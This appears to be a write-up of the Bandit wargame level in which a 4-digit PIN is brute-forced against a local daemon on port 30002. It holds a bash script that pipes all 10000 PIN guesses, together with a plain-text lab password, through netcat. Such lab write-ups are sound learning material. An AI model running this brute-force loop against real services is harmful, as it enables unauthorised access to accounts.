Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 
if given the password for bandit24 and a secret numeric 4-digit pincode. 
There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time


Solution

#!/bin/bash
password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"  

for i in $(seq -w 0000 9999); do
  echo "$password $i"
done | nc localhost 30002 | awk '/Correct!/ {getline; print; exit}'
